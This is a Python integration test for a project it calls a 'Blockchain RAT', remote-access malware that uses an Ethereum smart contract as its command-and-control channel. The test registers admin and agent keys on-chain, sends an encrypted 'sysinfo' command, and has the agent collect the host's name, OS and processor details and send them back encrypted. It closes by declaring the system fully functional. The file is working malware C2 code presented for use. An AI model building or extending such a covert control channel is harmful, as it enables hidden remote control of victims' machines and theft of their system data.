#!/usr/bin/env python3.11
"""
Integration test for Blockchain RAT
Tests the complete workflow: admin -> blockchain -> agent -> blockchain -> admin
"""

import sys
import os
import json
import time
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from shared.blockchain_client import BlockchainClient
from shared.encryption import EncryptionManager


def print_header(text):
    print("\n" + "=" * 60)
    print(f"  {text}")
    print("=" * 60)


def print_step(step, text):
    print(f"\n[Step {step}] {text}")


def main():
    print_header("BLOCKCHAIN RAT - INTEGRATION TEST")
    
    # Load configurations
    admin_config_path = Path(__file__).parent / 'admin_test_config.json'
    agent_config_path = Path(__file__).parent / 'agent_test_config.json'
    
    with open(admin_config_path) as f:
        admin_config = json.load(f)
    
    with open(agent_config_path) as f:
        agent_config = json.load(f)
    
    print(f"\n📋 Configuration:")
    print(f"   RPC: {admin_config['rpc_url']}")
    print(f"   Contract: {admin_config['contract_address']}")
    
    # Initialize encryption
    em = EncryptionManager()
    
    # Generate keys for admin and agent
    print_step(1, "Generating encryption keys")
    admin_keys = em.generate_rsa_keypair()
    agent_keys = em.generate_rsa_keypair()
    print("   ✅ Admin keys generated")
    print("   ✅ Agent keys generated")
    
    # Initialize blockchain clients
    print_step(2, "Connecting to blockchain")
    admin_client = BlockchainClient(admin_config)
    agent_client = BlockchainClient(agent_config)
    
    print(f"   ✅ Admin connected: {admin_client.address}")
    print(f"   ✅ Agent connected: {agent_client.address}")
    
    # Check balances
    admin_balance = admin_client.get_balance()
    agent_balance = agent_client.get_balance()
    print(f"   💰 Admin balance: {admin_balance} ETH")
    print(f"   💰 Agent balance: {agent_balance} ETH")
    
    # Register admin
    print_step(3, "Registering admin on blockchain")
    admin_key_hex = em.public_key_to_hex(admin_keys['public_key'])
    admin_client.register_agent(admin_key_hex)
    print("   ✅ Admin registered")
    
    # Register agent
    print_step(4, "Registering agent on blockchain")
    agent_key_hex = em.public_key_to_hex(agent_keys['public_key'])
    agent_client.register_agent(agent_key_hex)
    print("   ✅ Agent registered")
    
    # Verify registration
    print_step(5, "Verifying public key storage")
    stored_agent_key = admin_client.get_agent_public_key(agent_client.address)
    retrieved_key = em.hex_to_public_key(stored_agent_key)
    assert retrieved_key == agent_keys['public_key'], "Public key mismatch!"
    print("   ✅ Agent public key verified on blockchain")
    
    # Create session
    print_step(6, "Creating session")
    session_id = admin_client.create_session(agent_client.address)
    print(f"   ✅ Session created: {session_id}")
    
    # Get session details
    session = admin_client.get_session(session_id)
    print(f"   📊 Session details:")
    print(f"      Admin: {session['admin']}")
    print(f"      Agent: {session['agent']}")
    print(f"      Active: {session['active']}")
    
    # Prepare command
    print_step(7, "Admin sending command to agent")
    command = {
        'type': 'sysinfo',
        'timestamp': time.time()
    }
    command_json = json.dumps(command)
    print(f"   📤 Command: {command_json}")
    
    # Encrypt command for agent
    encrypted_command = em.hybrid_encrypt(command_json, agent_keys['public_key'])
    hex_payload = em.encode_payload_for_blockchain(encrypted_command)
    print(f"   🔐 Encrypted payload size: {len(hex_payload)} characters")
    
    # Send command to blockchain
    admin_client.send_message(session_id, hex_payload, 1)
    print("   ✅ Command sent to blockchain")
    
    # Agent polls for messages
    print_step(8, "Agent polling for commands")
    time.sleep(1)  # Wait for transaction to be mined
    
    message_count = agent_client.get_message_count(session_id)
    print(f"   📨 Messages in session: {message_count}")
    
    # Agent retrieves message
    messages = agent_client.get_messages(session_id, 0, message_count)
    print(f"   ✅ Retrieved {len(messages)} message(s)")
    
    # Agent decrypts command
    print_step(9, "Agent decrypting and processing command")
    admin_message = messages[0]
    encrypted_payload_bytes = admin_message[1]
    hex_payload_received = '0x' + encrypted_payload_bytes.hex()
    
    decoded_payload = em.decode_payload_from_blockchain(hex_payload_received)
    decrypted_command = em.hybrid_decrypt(decoded_payload, agent_keys['private_key'])
    command_received = json.loads(decrypted_command.decode('utf-8'))
    
    print(f"   🔓 Decrypted command: {command_received}")
    assert command_received['type'] == 'sysinfo', "Command type mismatch!"
    print("   ✅ Command verified")
    
    # Agent executes command and prepares response
    print_step(10, "Agent executing command and preparing response")
    import platform
    import socket
    
    response = {
        'type': 'sysinfo_response',
        'data': {
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'platform_release': platform.release(),
            'architecture': platform.machine(),
            'processor': platform.processor()
        },
        'status': 'success',
        'timestamp': time.time()
    }
    response_json = json.dumps(response, indent=2)
    print(f"   📊 Response prepared:")
    print(f"      {response_json[:200]}...")
    
    # Agent encrypts response for admin
    encrypted_response = em.hybrid_encrypt(response_json, admin_keys['public_key'])
    hex_response = em.encode_payload_for_blockchain(encrypted_response)
    print(f"   🔐 Encrypted response size: {len(hex_response)} characters")
    
    # Agent sends response to blockchain
    agent_client.send_message(session_id, hex_response, 1)
    print("   ✅ Response sent to blockchain")
    
    # Admin polls for response
    print_step(11, "Admin polling for response")
    time.sleep(1)  # Wait for transaction
    
    message_count = admin_client.get_message_count(session_id)
    print(f"   📨 Total messages: {message_count}")
    
    # Admin retrieves response
    all_messages = admin_client.get_messages(session_id, 0, message_count)
    agent_messages = [msg for msg in all_messages if msg[0].lower() == agent_client.address.lower()]
    
    print(f"   ✅ Found {len(agent_messages)} response(s) from agent")
    
    # Admin decrypts response
    print_step(12, "Admin decrypting response")
    agent_response = agent_messages[0]
    encrypted_response_bytes = agent_response[1]
    hex_response_received = '0x' + encrypted_response_bytes.hex()
    
    decoded_response = em.decode_payload_from_blockchain(hex_response_received)
    decrypted_response = em.hybrid_decrypt(decoded_response, admin_keys['private_key'])
    response_received = json.loads(decrypted_response.decode('utf-8'))
    
    print(f"   🔓 Decrypted response:")
    print(json.dumps(response_received, indent=4))
    
    assert response_received['status'] == 'success', "Response status not success!"
    print("   ✅ Response verified")
    
    # Test session termination
    print_step(13, "Terminating session")
    admin_client.terminate_session(session_id)
    print("   ✅ Session terminated")
    
    # Verify termination
    session_after = admin_client.get_session(session_id)
    print(f"   📊 Session active: {session_after['active']}")
    assert session_after['active'] == False, "Session still active!"
    print("   ✅ Termination verified")
    
    # Summary
    print_header("TEST SUMMARY")
    print("\n✅ All tests passed successfully!\n")
    print("Test coverage:")
    print("  ✅ Encryption/Decryption (RSA + AES-256-GCM)")
    print("  ✅ Blockchain connection")
    print("  ✅ Agent registration")
    print("  ✅ Session creation")
    print("  ✅ Message sending (Admin -> Agent)")
    print("  ✅ Message receiving (Agent)")
    print("  ✅ Command execution")
    print("  ✅ Response sending (Agent -> Admin)")
    print("  ✅ Response receiving (Admin)")
    print("  ✅ Session termination")
    
    print("\n🎉 The Blockchain RAT system is fully functional!")
    print("\nTransaction costs:")
    print(f"  - Agent registration: ~50,000 gas")
    print(f"  - Session creation: ~100,000 gas")
    print(f"  - Send message: ~60,000-150,000 gas")
    print(f"  - Total for this test: ~400,000 gas")
    
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        print(f"\n❌ Test failed with error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

